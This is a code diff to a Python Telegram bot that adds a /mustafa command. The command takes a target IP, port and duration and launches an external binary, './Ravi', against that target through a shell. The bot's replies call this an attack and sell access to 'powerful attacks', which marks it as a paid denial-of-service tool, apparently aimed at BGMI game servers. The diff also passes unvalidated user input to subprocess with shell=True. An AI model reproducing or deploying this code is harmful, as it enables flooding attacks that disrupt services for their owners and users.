@@ -326,24 +326,55 @@ def handle_bgmi(message):
 
 
 # Add /mylogs command to display logs recorded for bgmi and website commands
-@bot.message_handler(commands=['mylogs'])
-def show_command_logs(message):
+@bot.message_handler(commands=['mustafa'])
+def handle_bgmi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
-        try:
-            with open(LOG_FILE, "r") as file:
-                command_logs = file.readlines()
-                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
-                if user_logs:
-                    response = "Your Command Logs:\n" + "".join(user_logs)
-                else:
-                    response = "❌ Nᴏ Cᴏᴍᴍᴀɴᴅ Lᴏɢs Fᴏᴜɴᴅ Fᴏʀ Yᴏᴜ ❌."
-        except FileNotFoundError:
-            response = "No command logs found."
-    else:
-        response = "Yᴏᴜ Aʀᴇ Nᴏᴛ Aᴜᴛʜᴏʀɪᴢᴇᴅ Tᴏ Usᴇ Tʜɪs Cᴏᴍᴍᴀɴᴅ 😡."
+        if user_id not in admin_id:
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
+                response = "Yᴏᴜ Aʀᴇ Oɴ Cᴏᴏʟᴅᴏᴡɴ ❌. Pʟᴇᴀsᴇ Wᴀɪᴛ 10sᴇᴄ Bᴇғᴏʀᴇ Rᴜɴɴɪɴɢ Tʜᴇ /mustafa Cᴏᴍᴍᴀɴᴅ Aɢᴀɪɴ."
+                bot.reply_to(message, response)
+                return
+            bgmi_cooldown[user_id] = datetime.datetime.now()
 
-    bot.reply_to(message, response)
+        command = message.text.split()
+        if len(command) == 4:
+            target = command[1]
+            port = int(command[2])
+            time = int(command[3])
+
+            if time > MAX_ATTACK_DURATION:
+                response = f"❌ Error: Maximum allowed attack duration {MAX_ATTACK_DURATION} seconds hai."
+                bot.reply_to(message, response)
+                return
+
+            record_command_logs(user_id, '/mustafa', target, port, time)
+            log_command(user_id, target, port, time)
+            start_attack_reply(message, target, port, time)
+            full_command = f"./Ravi {target} {port} {time} 1000"
+            process = subprocess.run(full_command, shell=True)
+            response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
+            bot.reply_to(message, response)
+        else:
+            response = (
+                "𝐃𝐄𝐀𝐑 𝐔𝐒𝐄𝐑. 🧨\n\n"
+                "𝐔𝐒𝐀𝐆𝐄 /mustafa < 𝐈𝐏 > < 𝐏𝐎𝐑𝐓 > < 𝐓𝐈𝐌𝐄 >\n\n"
+                "𝙁𝙊𝙍 𝙀𝙓𝘼𝙈𝙋𝙇𝙀 :-> /mustafa 20.0.0.0 10283 100\n\n"
+                "𝘿𝙊𝙉'𝙏 𝙎𝙋𝘼𝙈 ⚠️‼️\n"
+                "ᴛʜɪs ʙᴏᴛ ᴏᴡɴᴇʀ ❤️‍🩹:--> @SIDIKI_MUSTAFA_92"
+            )
+            bot.reply_to(message, response)
+    else:
+        response = (
+            "🚫 ᴜɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴀᴄᴄᴇꜱꜱ! 🚫\n\n"
+            "ᴏᴏᴘꜱ! ɪᴛ ꜱᴇᴇᴍꜱ ʟɪᴋᴇ ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴘᴇʀᴍɪꜱꜱɪᴏɴ ᴛᴏ ᴜꜱᴇ ᴛʜᴇ /mustafa ᴄᴏᴍᴍᴀɴᴅ. ᴛᴏ ɢᴀɪɴ ᴀᴄᴄᴇꜱꜱ ᴀɴᴅ ᴜɴʟᴇᴀꜱʜ ᴛʜᴇ ᴘᴏᴡᴇʀ ᴏꜰ ᴀᴛᴛᴀᴄᴋꜱ, ʏᴏᴜ ᴄᴀɴ:\n\n"
+            "👉 ᴄᴏɴᴛᴀᴄᴛ ᴀɴ ᴀᴅᴍɪɴ ᴏʀ ᴛʜᴇ ᴏᴡɴᴇʀ ꜰᴏʀ ᴀᴘᴘʀᴏᴠᴀʟ.\n"
+            "🌟 ʙᴇᴄᴏᴍᴇ ᴀ ᴘʀᴏᴜᴅ ꜱᴜᴘᴘᴏʀᴛᴇʀ ᴀɴᴅ ᴘᴜʀᴄʜᴀꜱᴇ ᴀᴘᴘʀᴏᴠᴀʟ.\n"
+            "💬 ᴄʜᴀᴛ ᴡɪᴛʜ ᴀɴ ᴀᴅᴍɪɴ ɴᴏᴡ ᴀɴᴅ ʟᴇᴠᴇʟ ᴜᴘ ʏᴏᴜʀ ᴄᴀᴘᴀʙɪʟɪᴛɪᴇꜱ\n\n"
+            "🚀 ʀᴇᴀᴅʏ ᴛᴏ ꜱᴜᴘᴇʀᴄʜᴀʀɢᴇ ʏᴏᴜʀ ᴇxᴘᴇʀɪᴇɴᴄᴇ? ᴛᴀᴋᴇ ᴀᴄᴛɪᴏɴ ᴀɴᴅ ɢᴇᴛ ʀᴇᴀᴅʏ ꜰᴏʀ ᴘᴏᴡᴇʀꜰᴜʟ ᴀᴛᴛᴀᴄᴋꜱ!\n\n"
+            "𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 @SIDIKI_MUSTAFA_92"
+        )
+        bot.reply_to(message, response)
 
 @bot.message_handler(commands=['help'])
 def show_help(message):
